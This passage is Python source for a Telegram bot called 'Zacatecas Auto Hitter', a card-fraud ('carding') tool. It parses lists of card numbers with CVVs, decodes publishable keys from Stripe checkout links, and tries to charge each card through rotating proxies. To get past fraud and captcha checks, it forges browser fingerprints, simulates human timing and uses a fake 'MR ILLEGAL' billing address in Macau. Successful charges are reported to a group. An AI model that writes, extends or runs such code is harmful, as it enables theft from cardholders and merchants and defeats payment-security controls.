        fp = random.choice(fingerprints)
        
        fp.update({
            "color_depth": "24",
            "device_memory": str(random.choice([4, 8, 16])),
            "hardware_concurrency": str(random.choice([4, 8, 12])),
            "pixel_ratio": str(round(random.uniform(1.0, 2.0), 2)),
            "webgl_vendor": random.choice(["Google Inc.", "NVIDIA Corporation", "Intel Inc."]),
            "webgl_renderer": random.choice(["ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0)", 
                                           "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)"]),
            "canvas_fp": AdvancedCaptchaBypass._generate_canvas_fingerprint(),
            "audio_fp": hashlib.md5(str(timestamp).encode()).hexdigest()[:16],
            "fonts": AdvancedCaptchaBypass._generate_font_list(),
            "plugins": "Chrome PDF Viewer, Chrome PDF Plugin, Native Client",
            "webgl_hash": hashlib.sha256(str(timestamp).encode()).hexdigest()[:64],
            "session_id": hashlib.md5(str(random.random()).encode()).hexdigest()[:32]
        })
        
        return fp
    
    @staticmethod
    def _generate_canvas_fingerprint() -> str:
        """Generate unique canvas fingerprint"""
        base = "CanvasFingerprint"
        noise = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        return hashlib.md5((base + noise).encode()).hexdigest()
    
    @staticmethod
    def _generate_font_list() -> str:
        """Generate random font list"""
        font_sets = [
            "Arial, Arial Black, Comic Sans MS, Courier New, Georgia, Impact, Times New Roman, Trebuchet MS, Verdana",
            "Helvetica, Arial, Tahoma, Geneva, Verdana, sans-serif",
            "Microsoft JhengHei, SimHei, SimSun, PMingLiU, MingLiU",
            "Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans"
        ]
        return random.choice(font_sets)
    
    @staticmethod
    async def simulate_human_behavior() -> Dict:
        """Simulate human-like behavior patterns"""
        return {
            "mouse_moves": random.randint(3, 8),
            "click_delay": random.uniform(0.1, 0.5),
            "scroll_delay": random.uniform(0.2, 1.0),
            "typing_speed": random.uniform(50, 150),
            "thinking_time": random.uniform(1.0, 3.0)
        }
    
    @staticmethod
    def generate_captcha_bypass_headers(fingerprint: Dict, pk: str = None) -> Dict:
        """Generate headers untuk bypass captcha - FIXED"""
        headers = {
            "User-Agent": fingerprint["user_agent"],
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": fingerprint["language"],
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://checkout.stripe.com",
            "Referer": "https://checkout.stripe.com/",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "sec-ch-ua": fingerprint["sec_ch_ua"],
            "sec-ch-ua-mobile": fingerprint["sec_ch_ua_mobile"],
            "sec-ch-ua-platform": fingerprint["sec_ch_ua_platform"],
            "DNT": "1",
            "TE": "trailers"
        }
        
        if pk:
            headers["Authorization"] = f"Bearer {pk}"
        
        return headers

# ========== ROTATING PROXY SYSTEM ==========

class RotatingProxyManager:
    """Manage rotating proxies for checkout"""
    
    @staticmethod
    def get_rotating_proxy(user_id: int) -> Optional[str]:
        """Get rotating proxy for user"""
        proxies = load_proxies()
        user_proxies = proxies.get(str(user_id), [])
        
        if not user_proxies:
            return None
        
        # Shuffle proxies for rotation
        random.shuffle(user_proxies)
        
        # Get alive proxy
        for proxy in user_proxies:
            proxy_url = get_proxy_url(proxy)
            if proxy_url:
                return proxy
        
        return None if not user_proxies else random.choice(user_proxies)
    
    @staticmethod
    def get_proxy_ip(proxy_str: str) -> str:
        """Get IP from proxy string"""
        parsed = parse_proxy_format(proxy_str)
        return parsed.get("host", "Unknown")
    
    @staticmethod
    def get_proxy_port(proxy_str: str) -> str:
        """Get port from proxy string"""
        parsed = parse_proxy_format(proxy_str)
        return str(parsed.get("port", "Unknown"))

# ========== LOADING SYSTEM ==========

class ZACATECASLoader:
    """Loading animations system"""
    
    @staticmethod
    async def create_loading(message: Message, text: str = "LOADING..."):
        """Progress bar loading"""
        frames = ["[░░░░░░░░░░]", "[█░░░░░░░░░]", "[██░░░░░░░░]", "[███░░░░░░░]", "[████░░░░░░]",
                 "[█████░░░░░]", "[██████░░░░]", "[███████░░░]", "[████████░░]", "[█████████░]", "[██████████]"]
        
        loading_msg = await message.answer(f"```\n[ ZACATECAS HITTER ]\n{frames[0]} 0%\n{text}\n```")
        
        for i in range(1, 11):
            try:
                frame_idx = min(i, len(frames) - 1)
                percent = i * 10
                await loading_msg.edit_text(f"```\n[ ZACATECAS HITTER ]\n{frames[frame_idx]} {percent}%\n{text}\n```")
                await asyncio.sleep(0.05)
            except:
                continue
        
        try:
            await loading_msg.edit_text(f"```\n[ ZACATECAS HITTER ]\n{frames[-1]} 100%\nREADY\n```")
        except:
            pass
        
        await asyncio.sleep(0.1)
        return loading_msg
    
    @staticmethod
    async def parsing_loading(message: Message, text: str = "THE ZACATECAS"):
        """Stripe parsing animation"""
        bars = ["▱▱▱▱▱▱▱▱▱▱", "▰▱▱▱▱▱▱▱▱▱", "▰▰▱▱▱▱▱▱▱▱", "▰▰▰▱▱▱▱▱▱▱", "▰▰▰▰▱▱▱▱▱▱",
                "▰▰▰▰▰▱▱▱▱▱", "▰▰▰▰▰▰▱▱▱▱", "▰▰▰▰▰▰▰▱▱▱", "▰▰▰▰▰▰▰▰▱▱", "▰▰▰▰▰▰▰▰▰▱", "▰▰▰▰▰▰▰▰▰▰"]
        
        loading_msg = await message.answer(f"[ ZACATECAS ]\n{bars[0]}\n{text}\n```")
        
        for i in range(len(bars)):
            try:
                percent = min((i + 1) * 10, 100)
                await loading_msg.edit_text(f"[ HITTER CHECKOUTER ]\n{bars[i]} {percent}%\n{text}\n")
                await asyncio.sleep(0.07)
            except:
                continue
        
        return loading_msg
    
    @staticmethod
    async def proxy_loading(message: Message, text: str = "SCANNING PROXIES..."):
        """Proxy scanning animation"""
        frames = ["▱▱▱▱▱▱▱▱▱▱", "▰▱▱▱▱▱▱▱▱▱", "▰▰▱▱▱▱▱▱▱▱", "▰▰▰▱▱▱▱▱▱▱", "▰▰▰▰▱▱▱▱▱▱",
                 "▰▰▰▰▰▱▱▱▱▱", "▰▰▰▰▰▰▱▱▱▱", "▰▰▰▰▰▰▰▱▱▱", "▰▰▰▰▰▰▰▰▱▱", "▰▰▰▰▰▰▰▰▰▱" "▰▰▰▰▰▰▰▰▰▰"]
        
        loading_msg = await message.answer(f"```\n[ PROXY SCAN ]\n{frames[0]}\n{text}\n```")
        
        for i in range(8):
            try:
                frame = frames[i % len(frames)]
                await loading_msg.edit_text(f"```\n[ PROXY SCAN ]\n{frame}\n{text}\n```")
                await asyncio.sleep(0.1)
            except:
                break
        
        return loading_msg

# ========== NEW SESSION MANAGEMENT ==========

async def create_fresh_session(proxy_url: str = None) -> aiohttp.ClientSession:
    """Create fresh session untuk setiap card - FIXED"""
    connector = aiohttp.TCPConnector(
        limit=1,
        ssl=False,
        force_close=True,
        ttl_dns_cache=0
    )
    
    timeout = aiohttp.ClientTimeout(total=15, connect=5, sock_read=10)
    
    return aiohttp.ClientSession(
        connector=connector,
        timeout=timeout
    )

async def get_ip_display(session: aiohttp.ClientSession, proxy_url: str = None) -> str:
    """Get IP untuk display (format 1.1.1.1)"""
    try:
        async with session.get(
            "http://ip-api.com/json",
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=5)
        ) as r:
            if r.status == 200:
                data = await r.json()
                return data.get("query", "N/A")
    except:
        pass
    
    # Fallback ke parsing dari proxy URL
    if proxy_url:
        try:
            if "@" in proxy_url:
                parts = proxy_url.split("@")
                if len(parts) > 1:
                    ip_part = parts[1].split(":")[0]
                    return ip_part
            else:
                ip_part = proxy_url.split("://")[-1].split(":")[0]
                return ip_part
        except:
            pass
    
    return "N/A"

# ========== HTML PRE FORMATTER ==========

def format_html_pre(content: str) -> str:
    """Format text untuk HTML <pre> tag"""
    return f"<pre>\n{content}\n</pre>"

# ========== NOTIFICATION SYSTEM ==========

async def send_charged_notification(card: dict, checkout_data: dict, user: Message):
    """Send charged notification to group - NO CARD DISPLAY"""
    try:
        currency = checkout_data.get('currency', 'USD')
        sym = get_currency_symbol(currency)
        price = checkout_data.get('price', 0)
        price_str = f"{sym}{price:.2f}" if price else "N/A"
        
        merchant = checkout_data.get('merchant', 'Unknown') or 'Unknown'
        product = checkout_data.get('product', 'Unknown') or 'Unknown'
        customer_email = checkout_data.get('customer_email', 'Unknown') or 'Unknown'
        site = checkout_data.get('site', 'checkout.stripe.com') or 'Unknown'
        
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_id = str(user.from_user.id)
        
        notification = f"""╔════════════════════════════════════════╗
║         🔥 CHARGED NOTIFICATION        ║
╠════════════════════════════════════════╣
║ USER    : {user_id:<24} ║
║ MERCHANT: {merchant[:24]:<24} ║
║ ITEM    : {product[:24]:<24} ║
║ AMOUNT  : {price_str:<24} ║
║ EMAIL   : {customer_email[:24]:<24} ║
║ TIME    : {current_time:<24} ║
║ SITE    : {site[:24]:<24} ║
╠════════════════════════════════════════╣
║   Thanks Using - Zacatecas Auto Hitter ║
║               By @ile_gal              ║
╚════════════════════════════════════════╝"""
        
        await user.bot.send_message(
            chat_id=CHARGED_GROUP,
            text=format_html_pre(notification),
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        print(f"Notification error: {e}")

# ========== PROXY FUNCTIONS ==========

def parse_proxy_format(proxy_str: str) -> dict:
    proxy_str = proxy_str.strip()
    result = {"user": None, "password": None, "host": None, "port": None, "raw": proxy_str}
    
    try:
        if '@' in proxy_str:
            if proxy_str.count('@') == 1:
                auth_part, host_part = proxy_str.rsplit('@', 1)
                if ':' in auth_part:
                    result["user"], result["password"] = auth_part.split(':', 1)
                if ':' in host_part:
                    result["host"], port_str = host_part.rsplit(':', 1)
                    result["port"] = int(port_str)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
                result["user"] = parts[2]
                result["password"] = parts[3]
            elif len(parts) == 2:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
    except:
        pass
    
    return result

def get_proxy_url(proxy_str: str) -> str:
    parsed = parse_proxy_format(proxy_str)
    if parsed["host"] and parsed["port"]:
        if parsed["user"] and parsed["password"]:
            return f"http://{parsed['user']}:{parsed['password']}@{parsed['host']}:{parsed['port']}"
        else:
            return f"http://{parsed['host']}:{parsed['port']}"
    return None

def get_user_proxies(user_id: int) -> list:
    proxies = load_proxies()
    user_data = proxies.get(str(user_id), [])
    if isinstance(user_data, str):
        return [user_data] if user_data else []
    return user_data if isinstance(user_data, list) else []

def add_user_proxy(user_id: int, proxy: str):
    proxies = load_proxies()
    user_key = str(user_id)
    if user_key not in proxies:
        proxies[user_key] = []
    elif isinstance(proxies[user_key], str):
        proxies[user_key] = [proxies[user_key]] if proxies[user_key] else []
    
    if proxy not in proxies[user_key]:
        proxies[user_key].append(proxy)
    save_proxies(proxies)

def remove_user_proxy(user_id: int, proxy: str = None):
    proxies = load_proxies()
    user_key = str(user_id)
    if user_key in proxies:
        if proxy is None or proxy.lower() == "all":
            del proxies[user_key]
        else:
            if isinstance(proxies[user_key], list):
                proxies[user_key] = [p for p in proxies[user_key] if p != proxy]
                if not proxies[user_key]:
                    del proxies[user_key]
            elif isinstance(proxies[user_key], str) and proxies[user_key] == proxy:
                del proxies[user_key]
        save_proxies(proxies)
        return True
    return False

def get_user_proxy(user_id: int) -> str:
    user_proxies = get_user_proxies(user_id)
    if user_proxies:
        return random.choice(user_proxies)
    return None

def obfuscate_ip(ip: str) -> str:
    if not ip:
        return "N/A"
    parts = ip.split('.')
    if len(parts) == 4:
        return f"{parts[0]}.{parts[1]}.{parts[2][0]}XX.{parts[3][0]}XX"
    return "N/A"

async def get_proxy_info(proxy_str: str = None, timeout: int = 10) -> dict:
    result = {
        "status": "dead",
        "ip": None,
        "ip_obfuscated": None,
        "country": None,
        "city": None,
        "org": None,
        "using_proxy": False
    }
    
    proxy_url = None
    if proxy_str:
        proxy_url = get_proxy_url(proxy_str)
        result["using_proxy"] = True
    
    try:
        async with aiohttp.ClientSession() as session:
            kwargs = {"timeout": aiohttp.ClientTimeout(total=timeout)}
            if proxy_url:
                kwargs["proxy"] = proxy_url
            
            async with session.get("http://ip-api.com/json", **kwargs) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "alive"
                    result["ip"] = data.get("query")
                    result["ip_obfuscated"] = data.get("query")  # TIDAK DISENSOR
                    result["country"] = data.get("country")
                    result["city"] = data.get("city")
                    result["org"] = data.get("isp")
    except:
        result["status"] = "dead"
    
    return result

async def check_proxy_alive(proxy_str: str, timeout: int = 10) -> dict:
    result = {
        "proxy": proxy_str,
        "status": "dead",
        "response_time": None,
        "external_ip": None,
        "error": None
    }
    
    proxy_url = get_proxy_url(proxy_str)
    if not proxy_url:
        result["error"] = "Invalid format"
        return result
    
    try:
        start = time.perf_counter()
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "http://ip-api.com/json",
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as resp:
                elapsed = round((time.perf_counter() - start) * 1000, 2)
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "alive"
                    result["response_time"] = f"{elapsed}ms"
                    result["external_ip"] = data.get("query")
    except asyncio.TimeoutError:
        result["error"] = "Timeout"
    except Exception as e:
        result["error"] = str(e)[:30]
    
    return result

async def check_proxies_batch(proxies: list, max_threads: int = 10) -> list:
    semaphore = asyncio.Semaphore(max_threads)
    
    async def check_with_semaphore(proxy):
        async with semaphore:
            return await check_proxy_alive(proxy)
    
    tasks = [check_with_semaphore(p) for p in proxies]
    return await asyncio.gather(*tasks)

async def get_session():
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
            timeout=aiohttp.ClientTimeout(total=20, connect=5)
        )
    return _session

# ========== STRIPE FUNCTIONS ==========

def get_currency_symbol(currency: str) -> str:
    symbols = {
        "USD": "$", "EUR": "€", "GBP": "£", "INR": "₹", "JPY": "¥",
        "CNY": "¥", "KRW": "₩", "RUB": "₽", "BRL": "R$", "CAD": "C$",
        "AUD": "A$", "MXN": "MX$", "SGD": "S$", "HKD": "HK$", "THB": "฿",
        "VND": "₫", "PHP": "₱", "IDR": "Rp", "MYR": "RM", "ZAR": "R",
        "CHF": "CHF", "SEK": "kr", "NOK": "kr", "DKK": "kr", "PLN": "zł",
        "TRY": "₺", "AED": "د.إ", "SAR": "﷼", "ILS": "₪", "TWD": "NT$"
    }
    return symbols.get(currency, "")

def check_access(msg: Message) -> bool:
    """Check if user has access"""
    user_id = msg.from_user.id
    
    # Owner always has access
    if user_id == OWNER_ID:
        return True
    
    # Check premium status
    premium_status = CodeManager.get_user_premium_status(user_id)
    
    if premium_status["premium"]:
        return True
    
    # Check if in allowed group
    if msg.chat.id == ALLOWED_GROUP:
        return True
    
    return False

def extract_checkout_url(text: str) -> str:
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
        r'https?://checkout\.stripe\.com/[^\s\"\'\<\>\)]+',
        r'https?://buy\.stripe\.com/[^\s\"\'\<\>\)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            url = m.group(0).rstrip('.,;:')
            return url
    return None

def decode_pk_from_url(url: str) -> dict:
    result = {"pk": None, "cs": None, "site": None}
    
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        
        if '#' not in url:
            return result
        
        hash_part = url.split('#')[1]
        hash_decoded = unquote(hash_part)
        
        try:
            decoded_bytes = base64.b64decode(hash_decoded)
            xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
            
            pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
            if pk_match:
                result["pk"] = pk_match.group(0)
            
            site_match = re.search(r'https?://[^\s\"\'\<\>]+', xored)
            if site_match:
                result["site"] = site_match.group(0)
        except:
            pass
            
    except:
        pass
    
    return result

def parse_card(text: str) -> dict:
    text = text.strip()
    parts = re.split(r'[|:/\\\-\s]+', text)
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not (15 <= len(cc) <= 19):
        return None
    month = parts[1].strip()
    if len(month) == 1:
        month = f"0{month}"
    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
        return None
    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if not (3 <= len(cvv) <= 4):
        return None
    return {"cc": cc, "month": month, "year": year, "cvv": cvv}

def parse_cards(text: str) -> list:
    cards = []
    for line in text.strip().split('\n'):
        line = line.strip()
        if line:
            card = parse_card(line)
            if card:
                cards.append(card)
    return cards

async def get_checkout_info(url: str) -> dict:
    start = time.perf_counter()
    result = {
        "url": url,
        "pk": None,
        "cs": None,
        "merchant": None,
        "price": None,
        "currency": None,
        "product": None,
        "country": None,
        "mode": None,
        "customer_name": None,
        "customer_email": None,
        "support_email": None,
        "support_phone": None,
        "cards_accepted": None,
        "success_url": None,
        "cancel_url": None,
        "init_data": None,
        "error": None,
        "time": 0
    }
    
    try:
        decoded = decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")
        
        if result["pk"] and result["cs"]:
            # BUAT SESSION BARU DENGAN FIX
            session = await create_fresh_session()
            
            try:
                # GENERATE FINGERPRINT DAN HEADERS DENGAN AUTHORIZATION
                fingerprint = AdvancedCaptchaBypass.generate_advanced_fingerprint()
                headers = AdvancedCaptchaBypass.generate_captcha_bypass_headers(fingerprint, result["pk"])
                
                body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
                
                async with session.post(
                    f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                    headers=headers,
                    data=body,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as r:
                    init_data = await r.json()
                
                if "error" not in init_data:
                    result["init_data"] = init_data
                    
                    acc = init_data.get("account_settings", {})
                    result["merchant"] = acc.get("display_name") or acc.get("business_name")
                    result["support_email"] = acc.get("support_email")
                    result["support_phone"] = acc.get("support_phone")
                    result["country"] = acc.get("country")
                    
                    lig = init_data.get("line_item_group")
                    inv = init_data.get("invoice")
                    if lig:
                        result["price"] = lig.get("total", 0) / 100
                        result["currency"] = lig.get("currency", "").upper()
                        if lig.get("line_items"):
                            items = lig["line_items"]
                            currency = lig.get("currency", "").upper()
                            sym = get_currency_symbol(currency)
                            product_parts = []
                            for item in items:
                                qty = item.get("quantity", 1)
                                name = item.get("name", "Product")
                                amt = item.get("amount", 0) / 100
                                interval = item.get("recurring_interval")
                                if interval:
                                    product_parts.append(f"{qty} × {name} (at {sym}{amt:.2f} / {interval})")
                                else:
                                    product_parts.append(f"{qty} × {name} ({sym}{amt:.2f})")
                            result["product"] = ", ".join(product_parts)
                    elif inv:
                        result["price"] = inv.get("total", 0) / 100
                        result["currency"] = inv.get("currency", "").upper()
                    
                    mode = init_data.get("mode", "")
                    if mode:
                        result["mode"] = mode.upper()
                    elif init_data.get("subscription"):
                        result["mode"] = "SUBSCRIPTION"
                    else:
                        result["mode"] = "PAYMENT"
                    
                    cust = init_data.get("customer") or {}
                    result["customer_name"] = cust.get("name")
                    result["customer_email"] = init_data.get("customer_email") or cust.get("email")
                    
                    pm_types = init_data.get("payment_method_types") or []
                    if pm_types:
                        cards = [t.upper() for t in pm_types if t != "card"]
                        if "card" in pm_types:
                            cards.insert(0, "CARD")
                        result["cards_accepted"] = ", ".join(cards) if cards else "CARD"
                    
                    result["success_url"] = init_data.get("success_url")
                    result["cancel_url"] = init_data.get("cancel_url")
                else:
                    error_msg = init_data.get("error", {}).get("message", "Init failed")
                    # CHECK INTEGRATION SURFACE ERROR - FIXED VERSION
                    if "integration surface" in error_msg.lower() or "unsupported" in error_msg.lower():
                        # COBA DAPATKAN INFO DARI CHECKOUT PAGE LANGSUNG
                        try:
                            async with aiohttp.ClientSession() as session2:
                                async with session2.get(f"https://checkout.stripe.com/c/pay/{result['cs']}", timeout=5) as r2:
                                    html = await r2.text()
                                    
                                    # Parse dari HTML
                                    title_match = re.search(r'<title>([^<]+)</title>', html)
                                    if title_match:
                                        title = title_match.group(1)
                                        if ' - ' in title:
                                            result["merchant"] = title.split(' - ')[0]
                                    
                                    amount_match = re.search(r'"amount"\s*:\s*(\d+)', html)
                                    if amount_match:
                                        result["price"] = int(amount_match.group(1)) / 100
                                    
                                    currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', html)
                                    if currency_match:
                                        result["currency"] = currency_match.group(1).upper()
                                    
                                    # Kasih info bahwa checkout bisa diproses dengan bypass
                                    result["error"] = "Restricted checkout - Use advanced bypass system"
                        except:
                            result["error"] = "Checkout restricted - Use advanced bypass system"
                    else:
                        result["error"] = error_msg
                        
            finally:
                await session.close()
        else:
            result["error"] = "Could not decode PK/CS from URL"
            
    except Exception as e:
        result["error"] = str(e)
    
    result["time"] = round(time.perf_counter() - start, 2)
    return result

async def charge_card_with_captcha_bypass(card: dict, checkout_data: dict, proxy_str: str = None, 
                                         bypass_3ds: bool = False, max_retries: int = 3,
                                         processing_msg: Message = None, card_index: int = 1,
                                         total_cards: int = 10) -> Tuple[dict, bool]:
    """Charge card dengan MULTI-APPROACH bypass system"""
    start = time.perf_counter()
    
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "approach": None,
        "captcha_detected": False,
        "captcha_bypassed": False,
        "retry_count": 0,
        "proxy_used": proxy_str,
        "ip_address": "N/A",
        "time": 0
    }
    
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    
    if not pk or not cs:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result, False
    
    approaches = ["approach1", "approach2", "approach3"]
    proxy_url = get_proxy_url(proxy_str) if proxy_str else None
    
    # Get IP untuk display
    ip_display = "N/A"
    if proxy_str:
        parsed = parse_proxy_format(proxy_str)
        ip_display = parsed.get("host", "Unknown")
    
    # COBA APPROACH ORIGINAL DULU
    for approach_idx, approach in enumerate(approaches):
        if approach_idx > 0:
            result["retry_count"] += 1
            if processing_msg:
                try:
                    await processing_msg.edit_text(
                        format_html_pre(f"Retry {result['retry_count']}/3\nCard: {card_index}/{total_cards}\nIP: {ip_display}"),
                        parse_mode="HTML"
                    )
                except:
                    pass
            
            await asyncio.sleep(random.uniform(1, 2))
        
        # BUAT SESSION BARU UNTUK SETIAP CARD
        session = None
        
        try:
            session = await create_fresh_session(proxy_url)
            
            # GET IP UNTUK DISPLAY
            try:
                result["ip_address"] = await get_ip_display(session, proxy_url)
            except:
                result["ip_address"] = ip_display
            
            # GENERATE FRESH FINGERPRINT
            fingerprint = AdvancedCaptchaBypass.generate_advanced_fingerprint()
            headers = AdvancedCaptchaBypass.generate_captcha_bypass_headers(fingerprint, pk)
            
            # UPDATE REFERER
            headers["Referer"] = f"https://checkout.stripe.com/c/pay/{cs}"
            
            # SIMULATE HUMAN DELAY
            await asyncio.sleep(random.uniform(0.3, 0.7))
            
            # CHECK CHECKOUT MASIH AKTIF
            try:
                body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
                async with session.post(
                    f"https://api.stripe.com/v1/payment_pages/{cs}/init",
                    headers=headers,
                    data=body,
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=8)
                ) as r:
                    if r.status != 200:
                        if approach_idx < len(approaches) - 1:
                            continue
                        else:
                            result["status"] = "SESSION_EXPIRED"
                            result["response"] = f"Checkout error: {r.status}"
                            result["time"] = round(time.perf_counter() - start, 2)
                            return result, False
                    
                    init_data = await r.json()
            except:
                if approach_idx < len(approaches) - 1:
                    continue
                else:
                    result["status"] = "ERROR"
                    result["response"] = "Connection failed"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result, False
            
            # CHECK ERRORS KHUSUS
            if "error" in init_data:
                err = init_data["error"]
                err_msg = err.get("message", "").lower()
                
                # CHECK "INTEGRATION SURFACE" ERROR - FIXED
                if any(x in err_msg for x in ["integration surface", "unsupported", "publishable key"]):
                    # GUNAKAN MULTI-APPROACH BYPASS
                    print(f"Merchant restricted detected, using bypass system...")
                    
                    # COBA SEMUA APPROACH BYPASS
                    bypass_result = await StripeCheckoutBypass.try_all_approaches(pk, cs, card, proxy_str)
                    
                    result["status"] = bypass_result.get("status")
                    result["response"] = bypass_result.get("response")
                    result["approach"] = bypass_result.get("approach", "Bypass System")
                    result["time"] = round(time.perf_counter() - start, 2)
                    
                    # Check captcha
                    response_lower = str(result.get("response", "")).lower()
                    if any(x in response_lower for x in ["captcha", "robot", "verification"]):
                        result["captcha_detected"] = True
                    
                    return result, result.get("captcha_detected", False)
                
                # CHECK "API KEY" ERROR
                if any(x in err_msg for x in ["api key", "authorization", "bearer"]):
                    result["status"] = "AUTH_ERROR"
                    result["response"] = "Authentication failed"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result, False
                
                if approach_idx < len(approaches) - 1:
                    continue
                else:
                    result["status"] = "INIT_ERROR"
                    result["response"] = err.get("message", "Init failed")
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result, False
            
            checksum = init_data.get("init_checksum", "")
            
            # SIMULATE HUMAN BEHAVIOR
            behavior = await AdvancedCaptchaBypass.simulate_human_behavior()
            await asyncio.sleep(behavior["thinking_time"])
            
            # CREATE NEW PAYMENT METHOD UNTUK CARD INI dengan BILLING MAKAU
            email = init_data.get("customer_email") or f"user{random.randint(100000, 999999)}@gmail.com"
            
            # ========== FIX: BILLING ADDRESS MAKAU ==========
            name = "MR ILLEGAL"
            country = "MO"  # Macau country code
            line1 = "123 MR ILLEGAL"
            city = "Macau"
            state = "MO"  # Macau state code sama dengan country
            zip_code = "999078"  # Kode pos Makau
            
            # CREATE PAYMENT METHOD dengan billing Makau
            pm_body = f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]=20{card['year']}&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][city]={city}&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&key={pk}"
            
            await asyncio.sleep(behavior["click_delay"])
            
            async with session.post("https://api.stripe.com/v1/payment_methods", 
                                  data=pm_body, 
                                  headers=headers,
                                  proxy=proxy_url,
                                  timeout=aiohttp.ClientTimeout(total=8)) as r:
                pm = await r.json()
            
            if "error" in pm:
                err = pm["error"]
                err_message = err.get("message", "").lower()
                err_code = err.get("code", "")
                
                # CHECK ERRORS KHUSUS - FIXED
                if any(x in err_message for x in ["integration surface", "unsupported", "publishable key"]):
                    # GUNAKAN MULTI-APPROACH BYPASS
                    print(f"Merchant restricted in payment method, using bypass...")
                    
                    bypass_result = await StripeCheckoutBypass.try_all_approaches(pk, cs, card, proxy_str)
                    
                    result["status"] = bypass_result.get("status")
                    result["response"] = bypass_result.get("response")
                    result["approach"] = bypass_result.get("approach", "Bypass System")
                    result["time"] = round(time.perf_counter() - start, 2)
                    
                    # Check captcha
                    response_lower = str(result.get("response", "")).lower()
                    if any(x in response_lower for x in ["captcha", "robot", "verification"]):
                        result["captcha_detected"] = True
                    
                    return result, result.get("captcha_detected", False)
                
                if any(x in err_message for x in ["api key", "authorization", "bearer"]):
                    result["status"] = "AUTH_ERROR"
                    result["response"] = "Authentication failed"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result, False
                
                if any(x in err_message for x in ["captcha", "robot", "verification", "security", "challenge"]):
                    result["captcha_detected"] = True
                    
                    if approach_idx < len(approaches) - 1:
                        continue
                    else:
                        result["status"] = "CAPTCHA_BLOCKED"
                        result["response"] = "Captcha blocked all attempts"
                        result["time"] = round(time.perf_counter() - start, 2)
                        return result, True
                
                # FIX TAX ERROR: Cek khusus untuk location/tax error
                if any(x in err_message for x in ["location", "tax", "address", "customer's location"]):
                    result["status"] = "TAX_ERROR"
                    result["response"] = "Location error - Using Macau address"
                    result["time"] = round(time.perf_counter() - start, 2)
                    # Tetap lanjut, karena sudah pakai billing Makau
                    pass
                
                elif "incorrect_cvc" in err_message or err_code == "incorrect_cvc":
                    result["status"] = "LIVE_INCORRECT_CVC"
                    result["response"] = "Incorrect CVC - Card LIVE"
                    if result["captcha_detected"]:
                        result["captcha_bypassed"] = True
                
                elif any(x in err_message for x in ["invalid_number", "expired_card", "invalid_expiry"]):
                    result["status"] = "DEAD"
                    result["response"] = err.get("message", "Card invalid")
                
                else:
                    result["status"] = "DECLINED"
                    result["response"] = err.get("message", "Card declined")
                
                result["time"] = round(time.perf_counter() - start, 2)
                return result, False
            
            pm_id = pm.get("id")
            if not pm_id:
                result["status"] = "FAILED"
                result["response"] = "No payment method ID"
                result["time"] = round(time.perf_counter() - start, 2)
                return result, False
            
            # CONFIRM PAYMENT dengan billing Makau
            lig = init_data.get("line_item_group")
            inv = init_data.get("invoice")
            if lig:
                total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
            elif inv:
                total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
            else:
                pi = init_data.get("payment_intent") or {}
                total = subtotal = pi.get("amount", 0)
            
